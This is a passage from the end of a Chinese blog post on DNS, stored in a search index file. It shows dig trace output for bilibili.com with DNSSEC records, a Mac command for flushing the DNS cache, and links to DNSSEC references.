class="hljs-number">190.53</span>#<span class="hljs-number">53</span>(h.root-servers.net) in <span class="hljs-number">104</span> ms<br><br>;; UDP setup with <span class="hljs-number">2001</span>:<span class="hljs-number">503</span>:<span class="hljs-number">39</span>c1::<span class="hljs-number">30</span>#<span class="hljs-number">53</span>(<span class="hljs-number">2001</span>:<span class="hljs-number">503</span>:<span class="hljs-number">39</span>c1::<span class="hljs-number">30</span>) for bilibili.com failed: network unreachable.<br>;; UDP setup with <span class="hljs-number">2001</span>:<span class="hljs-number">503</span>:d2d::<span class="hljs-number">30</span>#<span class="hljs-number">53</span>(<span class="hljs-number">2001</span>:<span class="hljs-number">503</span>:d2d::<span class="hljs-number">30</span>) for bilibili.com failed: network unreachable.<br>bilibili.com.<span class="hljs-number">172800</span>INNSns3.dnsv5.com.<br>bilibili.com.<span class="hljs-number">172800</span>INNSns4.dnsv5.com.<br>CK0POJMG874LJREF7EFN8430QVIT8BSM.com. <span class="hljs-number">86400</span> IN NSEC3 <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> - CK0Q2D6NI4I7EQH8NA30NS61O48UL8G5 NS SOA RRSIG DNSKEY NSEC3PARAM<br>CK0POJMG874LJREF7EFN8430QVIT8BSM.com. <span class="hljs-number">86400</span> IN RRSIG NSEC3 <span class="hljs-number">13</span> <span class="hljs-number">2</span> <span class="hljs-number">86400</span> <span class="hljs-number">20240317052456</span> <span class="hljs-number">20240310041456</span> <span class="hljs-number">4534</span> com. nDsu/HWipq9WrDO772lGr5Rm0BGksazMNQ4BCktOTsLTqadXRbTc8Tx8 W1gAunMnPlgJUg7EzY+Bu0NR3W4cig<span class="hljs-built_in">=</span><span class="hljs-built_in">=</span><br><span class="hljs-number">34</span>N8HDRIDRS931JVPDDJA5QLVPMOGVUB.com. <span class="hljs-number">86400</span> IN NSEC3 <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> - <span class="hljs-number">34</span>N8VR2QIA8E6FQT7AUGCM6FARONEELO NS DS RRSIG<br><span class="hljs-number">34</span>N8HDRIDRS931JVPDDJA5QLVPMOGVUB.com. <span class="hljs-number">86400</span> IN RRSIG NSEC3 <span class="hljs-number">13</span> <span class="hljs-number">2</span> <span class="hljs-number">86400</span> <span class="hljs-number">20240319051354</span> <span class="hljs-number">20240312040354</span> <span class="hljs-number">4534</span> com. C1pama7SsZ1nj2soxDM0wG3vGlXjMB1Mn20jEnBOAVmXFgoPN+bQpoXs UemGxrKrQe83kf10kN/<span class="hljs-number">52</span>ul4JYgIrQ<span class="hljs-built_in">=</span><span class="hljs-built_in">=</span><br>;; Received <span class="hljs-number">784</span> bytes from <span class="hljs-number">192.52</span>.<span class="hljs-number">178.30</span>#<span class="hljs-number">53</span>(k.gtld-servers.net) in <span class="hljs-number">164</span> ms<br><br>bilibili.com.<span class="hljs-number">60</span>INA<span class="hljs-number">8.134</span>.<span class="hljs-number">50.24</span><br>bilibili.com.<span class="hljs-number">60</span>INA<span class="hljs-number">47.103</span>.<span class="hljs-number">24.173</span><br>bilibili.com.<span class="hljs-number">60</span>INA<span class="hljs-number">119.3</span>.<span class="hljs-number">70.188</span><br>bilibili.com.<span class="hljs-number">60</span>INA<span class="hljs-number">139.159</span>.<span class="hljs-number">241.37</span><br>bilibili.com.<span class="hljs-number">86400</span>INNSns3.dnsv5.com.<br>bilibili.com.<span class="hljs-number">86400</span>INNSns4.dnsv5.com.<br>;; Received <span class="hljs-number">159</span> bytes from <span class="hljs-number">1.12</span>.<span class="hljs-number">0.16</span>#<span class="hljs-number">53</span>(ns4.dnsv5.com) in <span class="hljs-number">16</span> ms<br></code></pre></td></tr></table></figure><h2 id="清空DNS缓存"><a href="#清空DNS缓存" class="headerlink" title="清空DNS缓存"></a>清空DNS缓存</h2><h3 id="Mac电脑"><a href="#Mac电脑" class="headerlink" title="Mac电脑"></a>Mac电脑</h3><p><strong>sudo killall -HUP mDNSResponder</strong></p><h1 id="DNS安全加固"><a href="#DNS安全加固" class="headerlink" title="DNS安全加固"></a>DNS安全加固</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>[1] dnsviz.net</p><p>链接：<a href="https://dnsviz.net/d/pizzaseo.com/dnssec/">https://dnsviz.net/d/pizzaseo.com/dnssec/</a></p><p>[2] DNSSEC 2024-01-30 13:38:58</p><p>链接：<a href="https://help.aliyun.com/document_detail/149662.html">https://help.aliyun.com/document_detail/149662.html</a></p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>dns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dns</tag>
      
      <tag>network</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
